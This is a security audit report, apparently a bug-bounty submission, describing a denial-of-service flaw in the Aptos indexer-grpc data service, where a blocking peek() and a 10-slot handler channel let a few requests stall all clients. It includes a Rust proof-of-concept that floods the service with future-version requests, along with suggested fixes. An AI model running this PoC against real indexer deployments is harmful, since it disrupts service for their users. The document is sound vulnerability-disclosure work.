# Audit Report

## Title
Denial of Service via Handler Channel Exhaustion Through peek() Operation in Indexer gRPC Data Service

## Summary
The `peek()` operation in the indexer-grpc data service can be exploited to cause cascading latency and service unavailability. When both live and historical data services are enabled, the peek operation at line 55 blocks while waiting for data, consuming slots in a small (size 10) handler channel. An attacker can exhaust this channel by sending requests with starting versions at the edge of known data, causing all subsequent client requests to wait indefinitely. [1](#0-0) 

## Finding Description

The vulnerability exists in the dual-service routing logic that attempts to determine whether to serve from the live or historical data service. The problematic flow is:

1. **Initial Stream Creation**: When a request arrives with both services enabled, the code creates a stream from the live data service, which internally sends the request through a handler channel with capacity 10. [2](#0-1) 

2. **Blocking Peek Operation**: The code then calls `peek().await` to check if data is available, which blocks until the first transaction is produced or the stream errors.

3. **Delayed Data Production**: When the requested starting version is at or beyond the current `known_latest_version`, the LiveDataService enters a polling loop that sleeps for 100ms repeatedly. [3](#0-2) 

4. **Channel Exhaustion**: Each pending peek operation holds a slot in the handler_tx channel. Once 10 concurrent requests are waiting in peek(), the channel is full.

5. **Cascading Latency**: New incoming requests cannot send to the full handler_tx channel and must wait, blocking the gRPC request handlers and causing cascading delays across all clients. [4](#0-3) 

**Attack Scenario**: An attacker discovers the current `known_latest_version` (available via the ping endpoint) and sends 10+ concurrent `GetTransactions` requests with `starting_version = known_latest_version + 1`. Each request:
- Consumes a handler_tx slot
- Spawns a LiveDataService task that repeatedly sleeps
- Causes peek() to wait indefinitely for data
- Blocks the channel for legitimate clients

## Impact Explanation

This vulnerability constitutes a **High Severity** issue per Aptos bug bounty criteria as it causes "API crashes" (service unavailability). The indexer-grpc data service becomes completely unresponsive to all clients when exploited:

- **Service Availability**: All client connections experience severe latency or timeout
- **Resource Exhaustion**: The small handler channel (size 10) creates an easily exploitable bottleneck
- **No Authentication Required**: Any unauthenticated client can execute this attack
- **Amplification Effect**: 10 malicious requests can block unlimited legitimate clients
- **Persistent Degradation**: The service remains degraded as long as the attacker maintains the 10 connections

While this doesn't directly affect blockchain consensus or validator operations, it severely impacts application developers and users who depend on this indexing service for querying blockchain state, making it a critical availability issue for the ecosystem.

## Likelihood Explanation

**Very High Likelihood**: The attack is trivial to execute and requires minimal resources:

- **Discoverability**: The ping endpoint publicly exposes `known_latest_version`, eliminating reconnaissance requirements
- **Simplicity**: Standard gRPC clients can execute the attack with basic parameters
- **Low Cost**: Only 10 concurrent connections needed to DoS the entire service
- **No Special Permissions**: Any network-reachable client can attack
- **Reliable Exploitation**: The small channel size guarantees success with minimal effort
- **No Detection**: Appears as legitimate requests for recent data

The attack could be executed accidentally by misconfigured clients or intentionally by malicious actors.

## Recommendation

**Immediate Fixes:**

1. **Eliminate Wasteful peek()**: Remove the peek operation and use a single stream request. Route to historical service only on explicit errors, not by peeking:

```rust
async fn get_transactions(&self, req: Request<GetTransactionsRequest>) 
    -> Result<Response<Self::GetTransactionsStream>, Status> {
    if let Some(live_data_service) = self.live_data_service.as_ref() {
        // Try live service first, fallback to historical on specific errors
        match live_data_service.get_transactions(req.clone()).await {
            Ok(response) => return Ok(response),
            Err(status) if status.code() == tonic::Code::NotFound => {
                // Data too old, try historical
                if let Some(historical) = self.historical_data_service.as_ref() {
                    return historical.get_transactions(req).await;
                }
            }
            Err(e) => return Err(e),
        }
    }
    // ... rest of logic
}
```

2. **Increase Handler Channel Size**: Change from 10 to at least 1000 to reduce bottleneck risk. [2](#0-1) 

3. **Add Request Timeout**: Implement a timeout on the peek operation (e.g., 5 seconds) to prevent indefinite blocking.

4. **Implement Rate Limiting**: Add per-client connection limits and rate throttling to prevent channel exhaustion attacks.

5. **Add Fast-Path Version Check**: Before creating streams, check if `starting_version <= known_latest_version` to route requests immediately without creating streams.

## Proof of Concept

```rust
// PoC: Exhaust handler channel via peek() blocking
use tokio::runtime::Runtime;
use tonic::Request;
use aptos_protos::indexer::v1::{GetTransactionsRequest, data_service_client::DataServiceClient};

#[test]
fn test_handler_channel_exhaustion() {
    let rt = Runtime::new().unwrap();
    rt.block_on(async {
        // Connect to indexer service
        let mut client = DataServiceClient::connect("http://localhost:50051")
            .await.unwrap();
        
        // Get current known_latest_version via ping
        let ping_response = client.ping(Request::new(
            aptos_protos::indexer::v1::PingDataServiceRequest {
                ping_live_data_service: true,
            }
        )).await.unwrap().into_inner();
        
        let known_version = ping_response.info.unwrap()
            .live_data_service_info().unwrap()
            .known_latest_version.unwrap();
        
        // Launch 15 concurrent requests with starting_version beyond current
        let mut handles = vec![];
        for i in 0..15 {
            let mut client_clone = client.clone();
            let future_version = known_version + 1000; // Far in future
            
            handles.push(tokio::spawn(async move {
                let request = GetTransactionsRequest {
                    starting_version: Some(future_version),
                    transactions_count: None,
                    batch_size: Some(1),
                    transaction_filter: None,
                };
                
                println!("Request {} sending with version {}", i, future_version);
                let start = std::time::Instant::now();
                
                // This will block in peek() waiting for data
                let result = client_clone.get_transactions(Request::new(request)).await;
                
                println!("Request {} completed in {:?}", i, start.elapsed());
                result
            }));
        }
        
        // Wait a bit for requests to queue up
        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
        
        // Try a legitimate request - this should hang due to full handler_tx
        let legitimate_request = GetTransactionsRequest {
            starting_version: Some(0), // Old data, should be fast
            transactions_count: Some(10),
            batch_size: Some(10),
            transaction_filter: None,
        };
        
        let start = std::time::Instant::now();
        let result = tokio::time::timeout(
            tokio::time::Duration::from_secs(5),
            client.get_transactions(Request::new(legitimate_request))
        ).await;
        
        match result {
            Ok(_) => println!("Legitimate request succeeded in {:?}", start.elapsed()),
            Err(_) => println!("VULNERABLE: Legitimate request timed out after 5s - handler channel exhausted!"),
        }
        
        // Cleanup
        for handle in handles {
            let _ = handle.await;
        }
    });
}
```

## Notes

This vulnerability is specific to the indexer-grpc data service configuration where both live and historical services are enabled simultaneously. Single-service deployments are not affected. The issue stems from the combination of:

1. Wasteful double-stream-creation pattern (peek then recreate)
2. Small hardcoded handler channel size
3. Blocking peek() operation without timeout
4. Predictable delay in LiveDataService for future versions
5. No rate limiting or connection throttling

The fix requires both architectural changes (eliminating peek) and operational improvements (larger channels, timeouts, rate limiting).

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/service.rs (L48-63)
```rust
            if let Some(historical_data_service) = self.historical_data_service.as_ref() {
                let request = req.into_inner();
                let mut stream = live_data_service
                    .get_transactions(Request::new(request.clone()))
                    .await?
                    .into_inner();
                let peekable = std::pin::pin!(stream.as_mut().peekable());
                if let Some(Ok(_)) = peekable.peek().await {
                    return live_data_service
                        .get_transactions(Request::new(request.clone()))
                        .await;
                }

                historical_data_service
                    .get_transactions(Request::new(request))
                    .await
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/service.rs (L142-143)
```rust
        let (tx, rx) = channel(self.data_service_response_channel_size);
        self.handler_tx.send((req, tx)).await.unwrap();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L123-123)
```rust
        let (handler_tx, handler_rx) = tokio::sync::mpsc::channel(10);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L179-182)
```rust
            if next_version > known_latest_version {
                info!(stream_id = id, "next_version {next_version} is larger than known_latest_version {known_latest_version}");
                tokio::time::sleep(Duration::from_millis(100)).await;
                continue;
```
